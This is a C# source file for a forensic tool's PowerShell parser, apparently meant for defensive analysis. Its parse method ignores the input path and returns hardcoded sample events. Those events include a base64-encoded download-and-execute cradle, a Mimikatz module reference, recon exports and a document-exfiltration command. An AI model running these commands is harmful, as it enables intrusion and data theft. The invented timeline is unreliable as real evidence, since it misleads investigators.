using ForensicAnalyzerPro.Domain.Enums;
using ForensicAnalyzerPro.Domain.Interfaces;
using ForensicAnalyzerPro.Domain.Models;

namespace ForensicAnalyzerPro.Infrastructure.Parsers.PowerShell;

public class PowerShellParser : IForensicParser
{
    public ArtifactType ArtifactType => ArtifactType.PowerShell;
    public string Name => "PowerShell Parser";
    public string Description => "Parses PowerShell artifacts including PSReadLine history, script execution logs, module analysis cache, and operational event logs.";

    public Task<List<TimelineEvent>> ParseAsync(string path, CancellationToken ct = default)
    {
        var events = new List<TimelineEvent>();
        var now = DateTime.UtcNow;

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-10).AddHours(-2),
            SourceType = ArtifactType.PowerShell,
            SourceName = Name,
            EventType = "CommandExecuted",
            Description = "PowerShell command executed: encoded command used to download and execute remote payload",
            FilePath = path,
            User = "CONTOSO\\jsmith",
            Hash = "A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6",
            RiskLevel = RiskLevel.Critical,
            Metadata = new Dictionary<string, string>
            {
                { "CommandLine", "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AcABhAHkAbABvAGEAZAAnACkA" },
                { "HistoryId", "42" },
                { "ExecutionPolicy", "Bypass" },
                { "SourceFile", "ConsoleHost_history.txt" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-7).AddHours(-8),
            SourceType = ArtifactType.PowerShell,
            SourceName = Name,
            EventType = "ScriptExecuted",
            Description = "PowerShell script executed with network reconnaissance commands",
            FilePath = path,
            User = "CONTOSO\\administrator",
            Hash = "B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7",
            RiskLevel = RiskLevel.High,
            Metadata = new Dictionary<string, string>
            {
                { "ScriptPath", "C:\\Users\\jsmith\\Scripts\\recon.ps1" },
                { "ScriptContent", "Get-ADComputer -Filter * -Properties OperatingSystem | Export-CSV C:\\temp\\computers.csv" },
                { "ExecutionResult", "Success" },
                { "ExecutionTime", "00:00:45" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-4).AddHours(-15),
            SourceType = ArtifactType.PowerShell,
            SourceName = Name,
            EventType = "ModuleLoaded",
            Description = "Suspicious PowerShell module loaded with offensive security capabilities",
            FilePath = path,
            User = "CONTOSO\\jsmith",
            Hash = "C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8",
            RiskLevel = RiskLevel.High,
            Metadata = new Dictionary<string, string>
            {
                { "ModuleName", "Invoke-Mimikatz.ps1" },
                { "ModulePath", "C:\\Users\\jsmith\\Modules\\Invoke-Mimikatz\\Invoke-Mimikatz.ps1" },
                { "ModuleVersion", "2.2.1" },
                { "CommandCount", "37" },
                { "Source", "ModuleAnalysisCache" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddDays(-1).AddHours(-4),
            SourceType = ArtifactType.PowerShell,
            SourceName = Name,
            EventType = "OperationalLog",
            Description = "Operational log event: PowerShell pipeline execution details captured for forensic review",
            FilePath = path,
            User = "SYSTEM",
            Hash = null,
            RiskLevel = RiskLevel.Medium,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "4103" },
                { "ProviderName", "Microsoft-Windows-PowerShell" },
                { "PipelineLength", "5" },
                { "CommandType", "ScriptBlock" },
                { "Payload", "Get-WmiObject -Class Win32_Process | Select-Object Name, ProcessId, CommandLine | Export-Csv C:\\temp\\processes.csv" },
                { "LogName", "Microsoft-Windows-PowerShell/Operational" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddHours(-6),
            SourceType = ArtifactType.PowerShell,
            SourceName = Name,
            EventType = "CommandExecuted",
            Description = "Recent PowerShell command history entry showing exfiltration attempt",
            FilePath = path,
            User = "CONTOSO\\jsmith",
            Hash = "D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9",
            RiskLevel = RiskLevel.Critical,
            Metadata = new Dictionary<string, string>
            {
                { "CommandLine", "Compress-Archive -Path C:\\Users\\jsmith\\Documents\\*.docx -DestinationPath C:\\temp\\docs.zip; Move-Item C:\\temp\\docs.zip C:\\Users\\jsmith\\OneDrive\\" },
                { "HistoryId", "67" },
                { "StartTime", now.AddHours(-6).ToString("O") },
                { "HostApplication", "powershell.exe" }
            }
        });

        events.Add(new TimelineEvent
        {
            Timestamp = now.AddMinutes(-45),
            SourceType = ArtifactType.PowerShell,
            SourceName = Name,
            EventType = "OperationalLog",
            Description = "PowerShell process creation event with parent process chain analysis",
            FilePath = path,
            User = "CONTOSO\\jsmith",
            Hash = null,
            RiskLevel = RiskLevel.Medium,
            Metadata = new Dictionary<string, string>
            {
                { "EventID", "4688" },
                { "ProcessId", "7892" },
                { "ParentProcess", "C:\\Windows\\System32\\cmd.exe" },
                { "CommandLine", "powershell.exe -WindowStyle Hidden -NoProfile -Command \"Start-Process calc.exe\"" },
                { "LogName", "Security" }
            }
        });

        return Task.FromResult(events);
    }

    public Task<List<TimelineEvent>> ParseAsync(CancellationToken ct = default)
    {
        return ParseAsync(
            Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                @"WindowsPowerShell\v1.0"), ct);
    }

    public bool CanParse(string path)
    {
        if (string.IsNullOrWhiteSpace(path))
            return false;

        return path.Contains("PowerShell", StringComparison.OrdinalIgnoreCase) ||
               path.Contains("powershell", StringComparison.OrdinalIgnoreCase) ||
               path.Contains("ConsoleHost_history", StringComparison.OrdinalIgnoreCase) ||
               path.Contains("PSReadLine", StringComparison.OrdinalIgnoreCase);
    }
}
